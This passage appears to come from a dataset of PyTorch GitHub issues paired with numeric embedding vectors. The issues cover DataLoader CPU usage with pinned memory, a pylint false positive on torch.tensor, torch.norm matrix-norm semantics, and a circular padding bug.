 -1.68599844e-01  2.53473073e-01 -7.47200698e-02 -2.56911218e-01
 -3.62870544e-02 -2.76627719e-01  1.01931170e-01  2.37083528e-03
 -1.24455184e-01  1.37043282e-01  1.37125850e-01 -7.27553889e-02
 -1.87554993e-02 -9.95183736e-03 -9.49483961e-02  1.02064610e-01
  6.90589994e-02  2.04395190e-01  1.20038047e-01  4.67616379e-01
  2.21897244e-01  4.16621625e-01  1.63608864e-02  3.97110254e-01
 -2.43878618e-01 -3.26573178e-02 -3.02196860e-01 -8.04970413e-02
 -1.88444972e-01 -8.77691954e-02 -1.11145429e-01 -9.29422900e-02
  2.51031339e-01  2.98451424e-01 -7.62481689e-02  7.51968622e-02
 -1.52198151e-01  1.16734147e-01  4.00791377e-01 -3.04230209e-02
  1.35152459e-01 -1.56876743e-01 -1.28787667e-01 -9.99057665e-05
  3.30355503e-02  1.21646971e-01  4.97510657e-04 -1.16089523e-01]"
Very high CPU utilization with pin_memory=True and num_workers > 0 module: dataloader module: cpu triaged module: multithreading,"## ðŸ› Bug
There seems to be an issue with CPU utilization when using a DataLoader with pin_memory=True and num_workers > 0. 

I revisited some old code that had `pin_memory=True` and two workers that weren't doing all that much. It pinned all of my CPU cores at or near 100%, with 40-50% of the usage in the kernel.  I've had performance issues with pinned memory in the past, but never to this level. Indeed, I cannot reproduce the issue going back to some older environments with 0.4 or 1.0.1. But on 3 machines w/ PyTorch 1.1 and 1.2 I can easily reproduce by running the MNIST main.py from the current examples master.

If I set either num_workers=0 or pin_memory=False the issue goes away and I'm left with the expected one core and change of usage for MNIST (or two cores and change for my original case). 

## To Reproduce

1. Run `main.py` from the MNIST example on master pytorch/examples repository.

## Expected behavior

For MNIST, with 1 worker I expect roughly 1 core's worth of CPU utilization plus some overhead. It consumes 50-100% of all cores on systems with 8-14 physical (16-28 logical) cores. A large % of the CPU usage is in the kernel, appears to be spinning/yielding, possibly due to contention. 

## Environment

I've reproduced on 3 machines.

 - PyTorch Version (e.g., 1.0): 1.1 and 1.2 (no issue on an older 1.0.1 and 0.4.1 environment on one of the machines)
 - OS (e.g., Linux): two Ubuntu 18.04 machines, one Ubuntu 16.04 machine
 - How you installed PyTorch (`conda`, `pip`, source): All conda installs
 - Python version: 3.7.3 and 3.6.8
 - CUDA/cuDNN version: Cuda 10 and CUDNN 7.5.1 and 7.6.2
 - GPU models and configuration: dual Titan RTX one one machine, dual Titan Xp and 1080Ti on other two
 - Any other relevant information:

## Additional context
I've seen at least one very likely, and other potential threads in discussion forum that are likely this issue. 

This one has an htop screenshot from me, and another user:
https://discuss.pytorch.org/t/cpu-usage-extremely-high/52172/5



cc @SsnL",True,"[-0.16464992 -0.23977438 -0.11392615 -0.02353468 -0.21954341 -0.62220705
 -0.07248686  0.02696063 -0.47607    -0.24736284  0.02670115  0.11735058
 -0.24295896 -0.05150101  0.00869422  0.25138697  0.34676832 -0.05513935
  0.10148718 -0.07462098 -0.07561785 -0.22321063  0.12471172  0.2759642
  0.2548273   0.08109894 -0.02210501 -0.12784451  0.03830999 -0.18138683
  0.10789365  0.0551904   0.1983061  -0.14849189  0.17125806  0.05658535
 -0.23463708 -0.27599174 -0.14119445 -0.05264856  0.13978854  0.216343
  0.10048032 -0.05435368  0.0059965   0.03222623 -0.33968145  0.300448
 -0.22851402 -0.28921032  0.13335198  0.26067352  0.3045563  -0.36972612
  0.05262631 -0.11987787 -0.01967185 -0.06950342 -0.39460182  0.5937296
  0.31500566 -0.37806296  0.27890405  0.02652988  0.40343395 -0.12009706
  0.39324236 -0.03669653  0.13311717 -0.04738603  0.33769375  0.00512842
 -0.6537482  -0.06451607  0.3089949   0.03812531 -0.16940984 -0.10809229
  0.09463716 -0.17426854 -0.113288    0.02016746  0.19038038 -0.2383537
 -0.17806841 -0.10942174  0.17857477 -0.0393394  -0.20438062 -0.2134574
  0.16230515 -0.00304905 -0.4697577   0.08679037  0.46877992  0.00225324
  0.09690931  0.12506106 -0.48759347 -0.26787913  0.03041764 -0.19559826
 -0.04317102  0.27440655 -0.20591848 -0.37691212  0.10285214  0.49777144
  0.06666884  0.00514196  0.35189128  0.34446606 -0.02838732  0.08105269
  0.05753614 -0.1875983   0.04696461  0.09798283 -0.15035309  0.40390658
 -0.2589812  -0.12406274 -0.42325318 -0.06533222  0.04088445 -0.08104989
 -0.10958204  0.08555882  0.1584798  -0.15032163 -0.02884496 -0.1315252
  0.16955312 -0.36263657  0.07674465  0.13618979  0.07987564 -0.04999789
 -0.04115563 -0.44545358  0.12879261  0.16233763 -0.04280098 -0.5910726
  0.01542521  0.28242278  0.04002165 -0.17922902  0.20321769  0.14492716
  0.00477807  0.3194514   0.04966231  0.36296    -0.06535143  0.09958974
  0.315438   -0.00208945  0.23609576 -0.21826544  0.19117364  0.42821205
  0.21053675  0.04898278  0.5013537  -0.03658423 -0.08638702 -0.1151894
 -0.04185805  0.35376966 -0.3661904  -0.27133998 -0.30770254 -0.5653423
  0.3479641  -0.15146233 -0.18755113 -0.14101803 -0.06180437 -0.08528271
  0.2025777  -0.02442922  0.4592218  -0.09715636  0.11543014  0.06942205
  0.32935292  0.2590376  -0.15378894 -0.2602459  -0.78782535 -0.13837874
 -0.08244363  0.1665505   0.3881628  -0.11594355  0.00292451  0.35661948
 -0.14108397  0.15064466 -0.0665175   0.02230743  0.07093449  0.4963085
 -0.07332695 -0.11353927 -0.52144676 -0.28289482  0.11640126 -0.0122533
 -0.16060512 -0.05856634 -0.18359837  0.15328264 -0.37116948 -0.0510224
 -0.08775654  0.26657966  0.27051848  0.38412184  0.17046475 -0.10306236
 -0.4662709  -0.20752534 -0.19348177  0.29180443  0.08257501  0.24334393
  0.04111449 -0.15983552 -0.01538522 -0.42538738 -0.05363301 -0.01022479
 -0.15765601  0.24404275 -0.20345351  0.05953513 -0.1251907   0.09931688
 -0.38827023 -0.50042444 -0.17363763 -0.11072719  0.26496917  0.13632424
  0.22772513 -0.20446774  0.00444871  0.22633429 -0.4463966  -0.17834917
  0.3917371  -0.34442037  0.09626594 -0.03343631  0.38078517 -0.06666195
  0.15199247 -0.32192093  0.09828287  0.64923656  0.16939765  0.3235143
  0.04989797  0.04685391 -0.322756    0.17115343  0.13979924 -0.19265088
  0.16126908 -0.43404052  0.11955429 -0.07986786  0.15765074 -0.35192558
  0.7397975   0.05536623 -0.07425079 -0.16238949  0.39701593  0.17518887
  0.40349686 -0.20144972  0.17164178 -0.33964136 -0.00554209 -0.29397807
 -0.02233506 -0.01347737 -0.10957797 -0.05110112 -0.00311458  0.14052342
 -0.27401048  0.19362488  0.20913304  0.01942918 -0.14665082  0.07225078
 -0.5240884  -0.16688214  0.2246263   0.17429647 -0.7191465   0.2966562
 -0.02124093 -0.14856514  0.57732344 -0.14452618  0.13729253  0.2056857
 -0.49821955 -0.09541009 -0.37077102  0.1008201   0.00631776  0.39884394
 -0.09751281 -0.06731093  0.02260377 -0.32223484 -0.27853832  0.30395684
  0.5565467  -0.02705256 -0.17697784  0.21470396  0.23483528  0.5036173
  0.22730434 -0.05008003 -0.06756229 -0.22089218  0.2167801  -0.04044326
 -0.21958236 -0.01445827  0.0690949  -0.30584484 -0.11617647  0.13119563
 -0.281898    0.01691985 -0.10353756  0.1556458   0.2861964   0.7347081
  0.1487106   0.00491427 -0.18712823  0.08453711  0.12507871 -0.23173994
 -0.15372375  0.27940658 -0.1119267   0.13952376  0.18251222  0.32001147
 -0.2611806  -0.07303108 -0.18434608  0.20642245  0.5467753  -0.19655687
 -0.23652917  0.36662617  0.1811434   0.18219191 -0.1163583   0.08615451
  0.07873504  0.5684782   0.18340246 -0.18206716 -0.03143328 -0.41606873
  0.03846779  0.15889302  0.18126875 -0.24752481 -0.10812439 -0.14504091]"
Pylint Error `torch.tensor is not callable` high priority module: internals module: typing triaged small,"## ðŸ› Bug

Pylint returns the error `torch.tensor is not callable`

## To Reproduce

Steps to reproduce the behavior:

```python
import torch

if __name__ == ""__main__"":
    t = torch.tensor([1, 2, 3], dtype=torch.float64)
```

```
>>> pipenv run pylint test.py
test.py:4:8: E1102: torch.tensor is not callable (not-callable)
```

## Expected behavior

This shall not raise pylint error

## Environment

```
PyTorch version: 1.2.0
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.2 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
CMake version: version 3.10.2

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration:
GPU 0: GeForce RTX 2080 Ti
GPU 1: GeForce RTX 2080 Ti

Nvidia driver version: 418.67
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.1

Versions of relevant libraries:
[pip3] numpy==1.17.0
[pip3] torch==1.2.0
[conda] Could not collect

Pytorch installed in Pipenv Environment
pylint==2.3.1
```

## Additional context

None

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @bhosmer @smessmer @ljk53 @ailzhang @malfet @rgommers @xuzhao9 @gramster",True,"[-3.72778893e-01 -3.59363616e-01 -3.66315126e-01  6.61786348e-02
  1.08788878e-01 -3.51992816e-01  4.68882732e-03  1.06212705e-01
 -4.63269293e-01 -2.36862093e-01  7.42194355e-02  5.33927232e-05
 -5.78942955e-01  4.10179675e-01  1.08561404e-01 -9.24901292e-02
 -1.02562308e-01 -4.61549342e-01  4.06311229e-02 -4.14234325e-02
  3.39302659e-01  1.38295203e-01 -4.88995202e-03  1.27989590e-01
 -4.26038027e-01  1.60943449e-01 -5.58403358e-02 -1.08557701e-01
  3.26321155e-01  1.45800695e-01  1.94480211e-01 -1.69843718e-01
 -4.21931505e-01 -2.29625441e-02  8.78361911e-02  2.35989392e-01
 -4.82885897e-01 -1.46815404e-01 -9.01422054e-02  3.41645721e-03
  1.53613001e-01  1.65622264e-01 -1.74538851e-01 -5.17298244e-02
 -2.09890604e-02  9.21261162e-02  1.96000069e-01  1.68463707e-01
 -2.37405688e-01 -2.13848203e-01 -1.73027486e-01  3.35812718e-02
 -2.32041687e-01 -1.03536963e-01  1.03104442e-01 -3.52897763e-01
 -2.49090791e-02  6.86228788e-03  4.91114110e-02 -6.67041779e-01
 -5.53109013e-02  6.23619221e-02 -3.05351093e-02 -1.42498314e-01
 -2.17950583e-01  3.98590416e-02  1.05033420e-01  2.51890302e-01
  5.60865641e-01 -7.16445073e-02  9.67552811e-02  6.27162457e-02
 -2.58606195e-01  2.17044234e-01 -9.75304618e-02  3.41255575e-01
 -2.84946501e-01  1.92356735e-01 -3.03659439e-01 -2.04350874e-01
  1.75112057e-02 -3.25099528e-01 -7.05590248e-02  1.68533865e-02
  2.22432494e-01  1.42916024e-01  1.70783803e-01  1.64705291e-01
  2.81684965e-01  2.05001712e-01  4.18986499e-01  3.40747535e-01
 -1.29213315e-02  2.03095093e-01  7.19725490e-02  1.99493736e-01
  1.44541845e-01 -2.46649310e-01 -2.33206242e-01 -3.70890856e-01
 -2.97541678e-01 -7.23783433e-01 -3.84215117e-01  2.62058049e-01
  1.82516217e-01  7.62821138e-02  1.62733138e-01  1.66861415e-01
  3.55728388e-01 -2.21407026e-01  8.90810341e-02  3.95332314e-02
  3.51058960e-01 -7.70967752e-02  1.78359509e-01 -1.08983472e-01
 -4.60305810e-01 -2.60392651e-02  5.69052733e-02  3.12739611e-01
  4.03463282e-02  2.04252034e-01  2.55140215e-01  4.80948746e-01
  2.91852385e-01  8.63820314e-03 -1.63741820e-02  1.61036715e-01
  7.28341490e-02 -2.10495815e-02  3.10076773e-01 -1.23401299e-01
 -1.94164529e-01  2.05550849e-01  4.59817529e-01  1.53589964e-01
 -2.19814360e-01 -9.96353477e-02 -9.45118815e-02 -2.55368054e-01
 -2.06899107e-01  5.77239022e-02 -2.70295352e-01 -2.76765764e-01
  1.43613130e-01  9.24201831e-02 -1.51410416e-01  2.65006959e-01
  5.68926930e-02  2.32114196e-02 -1.04512408e-01 -1.02849156e-02
 -1.71587780e-01  4.38262045e-01  8.47180337e-02  8.74613971e-02
  2.51939058e-01 -4.48003784e-02  3.10557127e-01 -4.33597356e-01
  2.72869598e-02  2.04182416e-01 -2.94595072e-03 -2.90004797e-02
 -1.01595774e-01  1.82138145e-01 -3.62277627e-01 -3.80437315e-01
 -3.89700770e-01  3.31046991e-04 -2.04236969e-01  4.76916358e-02
 -1.66785479e-01 -8.95575583e-02 -7.14050978e-02  2.51051426e-01
 -1.37111187e-01 -8.82277966e-01 -1.75633907e-01  3.88180852e-01
  3.58913779e-01  6.42000675e-01  1.00936286e-01  2.50151567e-02
  7.67265856e-02 -3.83267775e-02  3.68150115e-01 -2.15478957e-01
  1.40197873e-02  2.32029200e-01 -2.66654938e-01 -1.04667529e-01
  2.49072403e-01  1.69625040e-03  5.88545948e-02  3.74688387e-01
  2.87904322e-01 -1.05039492e-01 -1.28622472e-01 -1.26522794e-01
 -4.66280393e-02 -1.63562104e-01 -8.53546858e-02 -1.28614038e-01
  1.03205130e-01 -3.40926439e-01 -2.01745450e-01 -2.91971266e-01
 -5.49542069e-01  2.34606918e-02 -1.33456200e-01 -3.20041031e-01
 -1.21876001e-01 -1.54719092e-02  4.08814847e-02  3.75723317e-02
  2.62834281e-02 -4.84649539e-02  6.16871566e-02  8.24965984e-02
  1.31758273e-01  2.02610672e-01 -2.85527036e-02 -4.05984879e-01
  1.42886817e-01  8.67929533e-02 -2.81362116e-01  2.09786221e-02
  5.12076691e-02  1.11183539e-01 -1.29188448e-01 -2.79967993e-01
  4.47278172e-01  2.76360750e-01  1.32254452e-01  2.47059003e-01
 -4.86787558e-02 -7.61701912e-02  8.54605585e-02  4.59629893e-01
 -2.41110280e-01  7.22234026e-02  3.17023396e-01 -1.45713001e-01
 -2.42979631e-01  6.58041164e-02 -3.47676128e-01 -1.38861686e-01
 -4.23775524e-01  2.37850547e-01  1.23631135e-01 -7.66983479e-02
 -8.67092703e-03  3.11196186e-02  6.03306890e-01 -5.73592819e-02
 -2.27327585e-01  3.25797591e-03  7.01070577e-02 -1.24460436e-01
 -2.05835495e-02  7.95853212e-02  1.96834803e-01  2.71497995e-01
  2.51404971e-01  9.35717206e-03 -3.14978093e-01  4.83890593e-01
 -9.79309678e-02  1.67663535e-03  5.71196936e-02 -5.41859269e-01
  3.82483274e-01 -1.63746849e-02  1.52666360e-01 -1.96485341e-01
  3.46019387e-01  1.26047045e-01  8.72421116e-02 -1.81362778e-01
  2.99213171e-01  4.52860117e-01 -1.91357881e-01  2.93217003e-01
  3.75690341e-01 -2.67200351e-01 -6.94357976e-02 -1.74689621e-01
 -4.85708684e-01 -1.96004152e-01 -2.61645585e-01  1.54895797e-01
  7.09834814e-01 -8.20446387e-02 -2.64876544e-01  3.58331084e-01
  1.71742022e-01 -1.08731046e-01 -7.05842227e-02  2.86252379e-01
 -1.54779017e-01  1.75652772e-01  1.46083713e-01 -1.55095726e-01
  1.09016567e-01 -7.46317357e-02  2.84868836e-01 -1.07391313e-01
  3.92893434e-01 -5.64649165e-01  4.00297344e-01  1.09706685e-01
 -1.70993343e-01  4.36177075e-01 -1.13461740e-01 -8.41146894e-03
  8.59073997e-02  3.99872541e-01  3.42848599e-01  6.44635595e-03
  8.53124410e-02 -2.14955091e-01 -2.43858367e-01  8.60413071e-03
 -2.47863546e-01 -1.01802662e-01 -1.67340860e-01  4.49793711e-02
 -2.08012521e-01 -3.56599577e-02 -8.42505228e-03 -2.31661811e-01
  1.70695797e-01  3.80249500e-01 -1.14550203e-01 -2.15658635e-01
 -2.93381989e-01  3.35297525e-01  5.01605757e-02 -3.77132148e-01
 -1.55901670e-01 -1.30191296e-01  8.98703001e-03 -3.57915223e-01
 -1.58123344e-01 -1.83161229e-01  3.81190777e-01 -1.88838206e-02
 -2.74937660e-01 -1.03774339e-01 -1.55690480e-02  4.33236510e-02
 -8.57007727e-02  4.25974429e-01  3.29025805e-01  5.78614950e-01
 -1.66392863e-01  7.18403310e-02  9.25444588e-02  3.61821353e-01
 -2.80948818e-01  1.52510792e-01 -4.25462782e-01 -3.91136676e-01
  1.36107460e-01 -6.72669113e-02 -2.44129598e-01 -2.27607176e-01
  1.23019785e-01  5.00627995e-01 -3.00617311e-02  2.96500087e-01
 -2.68166345e-02  1.26397565e-01  6.03090882e-01 -7.96520263e-02
 -1.93286806e-01  3.24667990e-01  1.31567106e-01 -2.76433289e-01
  3.24920714e-01  2.43926004e-01  8.23944956e-02 -4.66903150e-02]"
[FR] More consistent matrix norm for torch.norm high priority module: bc-breaking triaged module: numpy module: linear algebra,"`torch.norm` currently have the following inconsistent behavior where for matrix inputs and `ord` is a numerical value, **vector** norm is computed instead:
```
            =====  ============================  ==========================
            ord    matrix norm                   vector norm
            =====  ============================  ==========================
            None   Frobenius norm                2-norm
            'fro'  Frobenius norm                --
            'nuc'  nuclear norm                  --
            Other  as vec norm when dim is None  sum(abs(x)**ord)**(1./ord)
            =====  ============================  ==========================
```
(Even though the last row reads `when dim is None`, same behavior happens when `dim` is a 2-tuple).


However, the matrix Lpq norms are useful. And users are justified in expecting that `mat.norm(2)` computes the L2 norm (max e-value) since `mat.norm('fro')` computes the matrix Frobenius norm. If we follow the [NumPy interface](https://docs.scipy.org/doc/numpy/reference/generated/numpy.linalg.norm.html), the following behavior should be less surprising and error prune:

```

    =====  ============================  ==========================
    ord    norm for matrices             norm for vectors
    =====  ============================  ==========================
    None   Frobenius norm                2-norm
    'fro'  Frobenius norm                --
    'nuc'  nuclear norm                  --
    inf    max(sum(abs(x), axis=1))      max(abs(x))
    -inf   min(sum(abs(x), axis=1))      min(abs(x))
    0      --                            sum(x != 0)
    1      max(sum(abs(x), axis=0))      as below
    -1     min(sum(abs(x), axis=0))      as below
    2      2-norm (largest sing. value)  as below
    -2     smallest singular value       as below
    other  --                            sum(abs(x)**ord)**(1./ord)
    =====  ============================  ==========================
```

cc @ezyang @gchanan @zou3519 @SsnL @vishwakftw @jianyuh",True,"[-5.47192037e-01  1.09558165e-01 -1.44727960e-01 -1.95101380e-01
 -4.10393178e-01 -2.39823431e-01 -3.62264179e-02  1.82188183e-01
 -9.12824124e-02 -2.82606363e-01  1.00882620e-01 -2.01048195e-01
  3.01178396e-01  1.76020011e-01  7.35169649e-02 -2.90339589e-01
 -4.67820466e-01 -5.66547155e-01 -4.29988652e-01 -6.43206239e-02
  5.66632748e-01 -5.65996647e-01 -2.39649057e-01 -3.51520151e-01
 -2.88648814e-01  2.21671671e-01 -9.33227129e-04  8.65358338e-02
  6.19445026e-01  1.86843842e-01 -2.70680785e-01 -4.69430611e-02
 -2.77762920e-01 -3.84616572e-03 -4.46098149e-02 -5.76098487e-02
 -1.93147212e-01  2.12985620e-01 -4.43932533e-01  3.22921932e-01
  1.28956378e-01 -6.85453564e-02  2.93514699e-01 -6.29788265e-04
  1.84567690e-01  2.05613449e-01 -1.84448868e-01  2.73636263e-02
  2.06844240e-01  3.28250229e-04  5.05281948e-02  5.61001062e-01
  4.83766586e-01 -5.10185421e-01  9.90308523e-02 -1.94431901e-01
 -8.02941248e-02 -6.30373478e-01  8.80679674e-03 -4.31280255e-01
  4.45006549e-01 -4.75875568e-03 -4.58252877e-01  2.29633033e-01
  5.47408640e-01 -1.94800436e-01 -1.99424729e-01  6.38564900e-02
  2.41947353e-01  3.26648146e-01  1.44898787e-01 -8.87913927e-02
  6.26715720e-02 -2.32424065e-01 -2.48459786e-01 -6.34007379e-02
 -1.12463295e-01 -2.04140633e-01 -2.39597440e-01 -4.26067293e-01
  2.89467394e-01 -7.45313540e-02 -5.22262990e-01 -2.31025323e-01
 -9.22058076e-02 -4.09829617e-02  7.26973176e-01  1.19065326e-02
  6.52590156e-01 -4.49981540e-04  5.18016160e-01  3.10127258e-01
 -2.71329522e-01  3.47666502e-01  1.23753496e-01  3.25524658e-01
  4.73335117e-01 -3.81169617e-01 -1.92258805e-01 -2.54410118e-01
 -1.95938528e-01 -3.94767702e-01 -4.16157842e-01  2.58095264e-01
 -2.37415973e-02 -6.59977868e-02 -3.25733662e-01 -2.55797449e-02
  1.71620976e-02  1.29742205e-01  1.02052830e-01 -1.40456036e-02
 -1.57202616e-01 -8.90714079e-02 -3.57289314e-02 -6.90335691e-01
  2.67994218e-03  2.08449900e-01  7.94913843e-02 -1.26732484e-01
 -2.62749717e-02 -1.42072856e-01 -1.17386855e-01  1.57355100e-01
  5.51153779e-01  2.22569883e-01  2.20417947e-01  3.60703170e-01
 -1.20472066e-01  1.60150826e-01  1.55134454e-01 -2.95815974e-01
 -1.08553767e-01  2.37458438e-01  3.06129426e-01  5.32948494e-01
  2.90147550e-02  3.60275447e-01  2.60459453e-01  2.02620253e-01
 -1.59990013e-01 -1.73818395e-01  8.90245736e-02 -4.73311841e-01
  2.74879634e-01 -3.75758231e-01 -7.82768667e-01 -3.53397220e-01
 -4.69688047e-03 -1.98001295e-01 -1.77594721e-02 -3.38134706e-01
 -2.51074106e-01 -2.50091642e-01  3.07626367e-01 -2.70884573e-01
 -1.64547727e-01  7.96667635e-02  6.52092218e-01 -3.12968642e-01
 -3.16815317e-01  2.15097144e-01  4.22351271e-01  4.21998769e-01
  5.70162594e-01  4.92197305e-01 -6.56550080e-02 -3.82448196e-01
 -5.39400756e-01 -1.39044285e-01  3.77889305e-01 -3.58820587e-01
 -2.28661764e-02 -1.27348602e-01  1.74737737e-01 -3.84459972e-01
 -7.35492945e-01 -1.94348276e-01 -2.47063115e-01  6.03086770e-01
  4.22802448e-01  2.31936723e-01  6.19313359e-01  1.73759669e-01
  2.03214124e-01  6.08203262e-02  3.92182648e-01  1.77560523e-01
 -8.45122710e-02 -1.31268114e-01 -3.06198299e-01 -5.25183976e-01
 -3.02725613e-01  3.01514983e-01 -3.11802030e-01 -3.30061436e-01
  5.36956728e-01 -2.67659947e-02  2.82197177e-01  1.07731178e-01
 -7.15478957e-01 -7.88806528e-02  3.67116742e-03 -3.39668870e-01
  4.61444974e-01  7.39476204e-01  3.35182548e-01 -5.16344845e-01
 -5.93404770e-01  5.73620021e-01  4.46218625e-02 -6.04731366e-02
  1.08595319e-01 -1.08402103e-01  1.96725786e-01  2.75539458e-01
 -4.57838506e-01 -1.12553835e-01 -3.11480790e-01  2.74674177e-01
  6.13189638e-01  1.09301388e-01  3.11781578e-02 -6.15098357e-01
  6.83775097e-02  5.14547169e-01 -3.03765178e-01 -9.94195566e-02
  4.63873565e-01 -4.87608016e-01  5.05460322e-01 -3.01336288e-01
  5.17606020e-01  1.09066471e-01 -7.40420725e-03  3.20520163e-01
  4.70030963e-01 -5.85254580e-02  4.61307526e-01 -3.89353573e-01
 -4.01024044e-01 -3.24629992e-01 -2.10215509e-01 -6.16135299e-01
  5.62573150e-02  6.59429431e-01 -2.98786819e-01  2.16197595e-01
 -3.38883877e-01  3.48618388e-01 -5.18355727e-01  2.33366683e-01
 -4.58926469e-01 -1.11557618e-01 -8.93399268e-02 -4.42386270e-01
  1.56422064e-01  2.59969532e-01  4.39661555e-03 -4.33526456e-01
  9.07443166e-01  1.51749715e-01 -2.11070627e-01  5.15657902e-01
  3.83354872e-01  2.40583450e-01  8.39452893e-02  5.42598903e-01
 -6.38024032e-01 -1.47907972e-01  4.27302390e-01 -4.22611564e-01
  8.22056651e-01 -2.05601007e-01 -3.89865220e-01 -8.01467240e-01
 -4.03861217e-02 -6.45553470e-02 -5.10457397e-01 -6.10794783e-01
 -2.41187215e-01  2.62603939e-01 -4.89373147e-01  6.21899962e-01
  3.56873244e-01 -2.64789432e-01  2.13897377e-01  6.99209571e-01
  7.84153566e-02 -2.17139229e-01 -1.24274075e-01 -2.57834084e-02
 -8.88996758e-03 -3.56067084e-02 -7.72018433e-02  2.85520881e-01
  4.06380951e-01 -3.66115451e-01  3.95484209e-01  1.39354974e-01
  5.15977442e-01  2.92189658e-01  4.48640794e-01 -1.33251488e-01
 -5.89873314e-01 -1.52424991e-01  1.19286459e-02  6.31787181e-01
  5.10871887e-01 -1.15393475e-01  5.19793153e-01 -8.24169636e-01
 -9.10598487e-02  4.41612378e-02  8.43507499e-02  4.46595192e-01
 -4.27986622e-01 -8.39720760e-03  4.91385847e-01 -1.71058834e-01
 -3.62348199e-01 -4.01419252e-02 -5.40380955e-01 -1.24490447e-02
  2.17443168e-01  1.68634474e-01 -4.18415874e-01 -8.34820509e-01
 -4.95928377e-02  3.36901188e-01  1.97584197e-01  4.06641774e-02
  5.89889884e-02 -1.20419689e-01 -1.73903942e-01 -6.60086572e-02
 -4.85383064e-01  7.83531249e-01 -2.06177533e-01  3.46406847e-02
 -1.76962435e-01  1.43474653e-01  4.03785147e-02  2.54048854e-01
 -2.99749553e-01 -4.63512428e-02  3.27619389e-02 -5.41950986e-02
 -1.83370233e-01  1.68887209e-02  2.03925833e-01  1.80613101e-01
  1.42556995e-01  4.60187137e-01  5.02252042e-01  3.30078900e-01
  5.28978705e-01  5.31247584e-03 -3.21137965e-01  3.98064315e-01
  4.16125536e-01  1.94456130e-01 -2.38023221e-01  1.67464279e-02
 -1.65642966e-02  1.47216618e-01  4.65445340e-01  8.98418576e-02
 -1.28418595e-01  2.22320288e-01 -5.49849123e-02  6.25640392e-01
  3.09663340e-02 -4.78572212e-02  4.54371512e-01 -7.20090747e-01
  5.46441339e-02 -2.05501646e-01  7.19421953e-02 -2.39668250e-01
  3.29460382e-01 -1.09727144e-01 -8.76272544e-02  2.58154690e-01]"
Circular padding doesn't work when the 'right' side is 0 module: nn triaged,"Reproduction:
```
import torch
import torch.nn.functional as F

inputs = torch.randn(1, 1, 5, 5)
print(F.pad(inputs, [4,0,3,0], mode='circular').shape) # (1,1,5,5) (Wrong)
print(F.pad(inputs, [1,0,0,0], mode='circular').shape) # (1,1,5,5) (Wrong)
print(F.pad(inputs, [1,1,0,0], mode='circular').shape) # (1,1,5,7) (Correct)
print(F.pad(inputs, [2,1,0,0], mode='circular').shape) # (1,1,5,8) (Correct)
```

Correct results:
```
import torch
import torch.nn.functional as F

inputs = torch.randn(1, 1, 5, 5)
print(F.pad(inputs, [4,0,3,0], mode='circular').shape) # (1,1,8,9)
print(F.pad(inputs, [1,0,0,0], mode='circular').shape) # (1,1,5,6)
print(F.pad(inputs, [1,1,0,0], mode='circular').shape) # (1,1,5,7)
print(F.pad(inputs, [2,1,0,0], mode='circular').shape) # (1,1,5,8)
```



cc @SsnL",True,"[-3.59313726e-01  8.18767250e-02 -3.62924844e-01 -1.47635341e-01
  3.00656222e-02 -2.31388927e-01 -1.45160379e-02  3.07808667e-01
 -2.17671186e-01  6.06914535e-02 -2.06666067e-01  1.23898245e-01
  5.22650406e-03  2.79040515e-01 -2.77856767e-01 -1.11170992e-01
 -7.64435768e-01 -1.22878522e-01 -1.15513597e-02  4.86718379e-02
  2.29000092e-01 -6.48127273e-02  1.45742208e-01  4.28610556e-02
 -1.69115007e-01  3.93238783e-01  2.71497183e-02 -1.19874604e-01
  1.92051947e-01 -2.11111516e-01 -2.20564321e-01  4.40866202e-02
 -6.92153573e-01  1.59263849e-01  1.76434129e-01 -8.76665562e-02
 -4.75273371e-01  1.33202881e-01 -2.56340384e-01 -2.56883085e-01
  1.72335073e-01  1.71119675e-01  1.63655370e-01 -1.18114300e-01
  3.55927229e-01  5.12031496e-01 -1.10839874e-01  1.70559689e-01
  5.01288325e-02 -6.30408823e-02 -1.06278047e-01 -2.92733591e-02
  3.45762745e-02 -7.59220123e-02  9.74235609e-02  7.90616274e-02
 -2.18749031e-01 -3.12269509e-01  2.84653842e-01 -2.76203692e-01
  1.14116244e-01  7.02480972e-02 -2.17922628e-02  1.69889152e-01
  1.35674939e-01 -3.36490989e-01 -1.70579761e-01  3.06501593e-02
  3.59653905e-02  1.40936077e-02  1.24931827e-01  4.14636955e-02
 -6.17474616e-02  1.93840891e-01  2.46747464e-01 -1.77618302e-03
 -2.52919108e-01  1.19499601e-01 -3.81498396e-01 -1.61177754e-01
 -1.50307626e-01  2.27464736e-01  1.73767447e-01  4.15992476e-02
 -2.47341730e-02  2.50886679e-01  3.69142175e-01 -2.33656801e-02
  3.14146757e-01  2.36650094e-01  3.66206855e-01  2.99833119e-01
 -1.50554448e-01  1.32662743e-01 -1.65214986e-01  4.72014770e-04
  2.47401178e-01 -2.69798934e-01 -3.08552384e-01 -1.56627551e-01
 -2.99538702e-01 -2.59835720e-01 -7.95282722e-02  1.46091312e-01
  2.28723586e-01  1.37288183e-01 -5.80651984e-02  9.53856856e-03
  2.99411148e-01 -4.50905934e-02  1.57660484e-01  1.31478831e-02
 -2.31917381e-01 -4.71466705e-02 -3.57692897e-01 -2.28979841e-01
 -3.26927304e-01 -4.33179915e-01 -1.38076887e-01  2.11395249e-01
 -1.21541277e-01  7.50941709e-02 -3.31057422e-02  2.43601918e-01
  2.52208650e-01 -1.54723912e-01  4.06146348e-02  3.44577730e-02
 -2.28428513e-01  1.68669969e-01 -1.01912804e-02  9.13294703e-02
  8.43346566e-02 -1.54713422e-01  3.26691568e-01  2.65358150e-01
 -1.51614487e-01  1.42602250e-02 -1.73288256e-01 -1.19723894e-01
 -1.14219368e-01  1.64773077e-01 -2.45076805e-01 -3.89517754e-01
  4.06126916e-01 -1.58074260e-01 -3.91669214e-01 -9.71804187e-02
 -1.31541878e-01 -1.29045397e-01  1.28345907e-01 -2.85816014e-01
 -4.36293751e-01  3.38669032e-01  6.72459379e-02  3.83063033e-02
  1.15916878e-03 -1.87876411e-02  3.10284972e-01 -3.43760401e-01
  3.56693208e-01  1.01826154e-01  2.94350058e-01  2.52026878e-02
  2.67443895e-01 -5.67732528e-02 -3.52082476e-02  7.06565082e-02
 -3.87813270e-01  3.18343602e-02  2.21376985e-01  7.57740960e-02
 -3.04405063e-01  3.08594890e-02  3.86747777e-01  7.69621953e-02
